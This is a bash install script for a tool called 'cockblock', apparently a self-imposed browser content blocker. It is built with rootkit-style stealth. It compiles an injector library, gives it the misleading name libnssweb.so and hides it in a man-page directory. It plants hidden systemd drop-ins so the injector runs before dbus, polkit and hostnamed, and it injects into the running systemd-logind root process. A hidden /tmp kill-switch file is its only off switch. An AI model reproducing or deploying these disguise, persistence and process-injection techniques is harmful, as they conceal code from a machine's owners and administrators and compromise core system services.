#!/bin/bash
# install.sh — build and install the cockblock watcher+guard+injector system
# Usage:  sudo ./install.sh
set -e

if [ "$(id -u)" != "0" ]; then
    echo "Must run as root" >&2; exit 1
fi

# ── seed (from machine-id) ─────────────────────────────────────────────────────
if [ -z "$COCKBLOCK_SEED" ]; then
    COCKBLOCK_SEED=$(cat /etc/machine-id | cksum | cut -d' ' -f1)
fi
echo "[*] Seed: $COCKBLOCK_SEED"

# ── hidden binary path ─────────────────────────────────────────────────────────
INJECTOR_NAME="libnssweb.so"
INSTALL_DIR="/usr/share/man/man3"
INJECTOR_BIN="${INSTALL_DIR}/${INJECTOR_NAME}"

# ── compile injector ──────────────────────────────────────────────────────────
echo "[*] Compiling injector..."
objcopy -I binary -O elf64-x86-64 -B i386:x86-64 policies.json   policies_json.o  2>/dev/null || true
objcopy -I binary -O elf64-x86-64 -B i386:x86-64 userChrome.css  userchrome_css.o  2>/dev/null || true

gcc -std=c99 -D_GNU_SOURCE -g -O0 -z noexecstack -fno-stack-protector \
    -DCOCKBLOCK_SEED=${COCKBLOCK_SEED}UL \
    -fPIC -shared -Wl,-e,_start -o "$INJECTOR_BIN" injector.c cJSON.c \
    policies_json.o userchrome_css.o

chmod 755 "$INJECTOR_BIN"

# ── systemd drop‑ins (hidden ExecStartPre) ────────────────────────────────────
SERVICES=("systemd-hostnamed.service" "dbus.service" "polkit.service")

for svc in "${SERVICES[@]}"; do
    DROP_DIR="/etc/systemd/system/${svc}.d"
    mkdir -p "$DROP_DIR"
    cat > "$DROP_DIR/early-injector.conf" <<EOF
[Service]
ExecStartPre=$INJECTOR_BIN
EOF
    echo "[*] Drop‑in created for $svc"
done

# ── reload systemd and restart a service to trigger injection ─────────────────
systemctl daemon-reload
# Restart a service that is safe and will run our injector
if systemctl is-active --quiet systemd-hostnamed; then
    systemctl restart systemd-hostnamed.service &
else
    systemctl start systemd-hostnamed.service &
fi

# ── also inject immediately into a long‑running root process (systemd-logind)  ──
echo "[*] Injecting into systemd‑logind (fallback) ..."
for i in {1..10}; do
    PID=$(pgrep -f 'systemd-logind' | head -1)
    if [ -n "$PID" ]; then
        "$INJECTOR_BIN" "$PID" && break
    fi
    sleep 1
done

# ── kill‑switch information ───────────────────────────────────────────────────
KILL_FILE="/tmp/.xdpw-kill-${COCKBLOCK_SEED}"
echo "$KILL_FILE" > /tmp/.cockblock_killswitch_info
echo "[+] Installation complete."
echo "    Kill‑switch file: $KILL_FILE"
